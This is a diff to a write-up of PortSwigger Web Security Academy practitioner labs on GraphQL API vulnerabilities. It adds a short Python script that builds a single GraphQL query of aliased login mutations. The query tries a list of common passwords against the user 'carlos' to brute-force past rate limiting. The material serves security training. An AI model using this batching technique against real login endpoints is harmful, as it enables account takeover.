@@ -1,8 +1,3 @@
----
-layout: default
-render_with_liquid: false
----
-
 ## Labs Covered
 
 This write-up focuses on the following **PRACTITIONER-level labs** from the PortSwigger Web Security Academy related to **GraphQL API Vulnerabilities**:
@@ -580,6 +575,28 @@ To get the password of carlos
 
 **Note**: passwords are already provided to us
 
+
+### Fixed Code:
+
+```python
+passwords = "123456,password,12345678,qwerty".split(',')
+
+mutations = []
+for index, element in enumerate(passwords):
+    mutation = f"""
+    bruteforce{index}: login(input: {{ password: "{element}", username: "carlos" }}) {{
+        token
+        success
+    }}
+    """
+    mutations.append(mutation)
+
+query = "\n".join(mutations)
+print(query)
+```
+
+
+
 We have run script in reptile and we have get the payload
 
 <img width="1350" height="554" alt="image" src="https://github.com/user-attachments/assets/9476cf04-c6cc-44c4-9302-42dd02696140" />
@@ -659,6 +676,7 @@ Store and deliver to victum and lab is solved
 
 
 ---
+
 
 
 
